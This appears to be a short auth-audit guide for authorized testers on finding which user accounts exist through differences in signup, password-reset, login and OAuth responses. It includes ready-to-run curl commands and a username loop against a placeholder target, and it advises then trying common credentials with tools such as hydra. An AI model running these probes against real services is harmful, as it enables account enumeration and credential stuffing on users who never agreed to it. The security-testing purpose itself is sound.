# HOW TO TEST USERNAMES / ACCOUNTS (auth-audit guide, 2026 expert guide)
# Enumeration + credential usage on YOUR apps, labs and authorized infrastructure.

## The N ways to test
1. Signup endpoint: "email already registered" vs "available" - leak.
2. Password reset: same response difference -> confirm existing accounts.
3. Login timing / error: "user does not exist" vs "wrong password" - could be a bug or by-design UX.
4. OAuth/SSO: error text on account-not-linked vs password-wrong.
5. Rate-limit audit on the login/reset endpoint (owned platform only).
6. Default-account lists (Credentials + Username folders): admin, test, support on YOUR devices.
7. Base64 admin list usage in the login automation you write for your own lab.

## Step-by-step on target (authorized)
1. Grab a reset flow:  POST /forgot  body email: existing@ / missing@ -> compare messages/status.
2. Signup flow: same names - if either text tells you the account exists, you have enumeration.
3. Only with scope: an automated enumeration (ffuf with rockyou) of the reset path - but STOP at first hit,
   don't go mass-account, stay inside the allowed asset list.
4. Take the enumerated usernames + common creds list -> try on the related admin panel (your box).

## Worked examples (concrete)
# enum via signup:
curl -s -X POST -d 'email=admin@target.com' https://target.com/signup | grep -io "already.*"
curl -s -X POST -d 'email=zzz_nonexisting_9@target.com' https://target.com/signup | grep -io "available.*"
# reset difference:
curl -s -X POST -d 'email=known@target.com' https://target.com/forgot      # 200 ok / token
curl -s -X POST -d 'email=nope@target.com' https://target.com/forgot       # 404 / generic "if exists"
# login timing:
time curl -s -X POST -d 'u=admin&p=x' https://target.com/login   # measure vs wrong-user time
# combining with username list:
for u in admin administrator test backup support; do
  curl -s -o /dev/null -w "$u %{http_code}\n" -X POST -d "email=$u@target.com" https://target.com/forgot
done

## False positives & scope
- "Invalid password" for a real user = enumeration often accepted as INFO; only combined with a follow-on
  (credential stuffing risk) it becomes Medium.
- Check program rules: many pay only when OAuth/2FA bypass involved.

## Tools
- Burp Intruder (wordlists from Username/), ffuf for the enum, patator/hydra only where host rule allows.
